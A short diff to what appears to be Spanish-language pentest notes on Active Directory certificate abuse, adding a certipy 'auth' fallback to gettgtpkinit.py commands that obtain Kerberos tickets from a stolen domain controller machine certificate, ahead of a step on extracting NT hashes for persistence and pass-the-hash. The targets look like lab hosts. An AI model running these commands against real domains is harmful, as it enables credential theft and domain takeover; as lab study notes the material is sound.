@@ -93,6 +93,9 @@ python3 gettgtpkinit.py -cert-pfx ./usuario.pfx -pfx-pass 'clave123' -dc-ip 10.1
 
 # Ejemplo para MÁQUINA:
 python3 gettgtpkinit.py -cert-pfx ./DC01\$.pfx -dc-ip 10.10.10.10 'corp.local/dc01$' /tmp/dc.ccache
+
+##### SI FALLA GETTGTPKINIT USAREMOS CERTIPY
+certipy auth -pfx dc01.pfx -dc-ip 10.129.234.174 -username dc01$ -domain inlanefreight.local
 ```
 
 ### Paso B: Extraer el Hash NT de la cuenta (Persistencia / Pass the Hash)
